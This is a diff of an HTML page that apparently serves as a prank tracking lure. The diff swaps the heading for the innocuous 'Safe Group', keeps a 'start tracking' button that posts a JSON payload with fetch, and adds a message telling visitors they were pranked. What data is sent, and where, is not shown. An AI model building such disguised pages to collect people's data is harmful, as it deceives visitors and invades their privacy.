@@ -17,8 +17,7 @@
 <body>
 
     <div class="container">
-        <h1>🛡️ Nah, 
-              I'd Win</h1>
+        <h1>🛡️ Safe Group</h1>
         <span id="display-name" style="color:#5865f2; font-weight:bold; font-size: 20px;">Azonosítás...</span>
         
         <button id="mainBtn" class="btn" onclick="initTracking()">KÖVETÉS INDÍTÁSA</button>
@@ -97,12 +96,13 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             }).then(() => {
-                document.getElementById("status").innerHTML = "✅ Gojo is coming for you!" + new Date().toLocaleTimeString();
+                document.getElementById("status").innerHTML = "✅ Gojo is coming for you! and i pranked you...    Nah I'd Win." + new Date().toLocaleTimeString();
             });
         }
     </script>
 </body>
 </html>
+
 
 
 
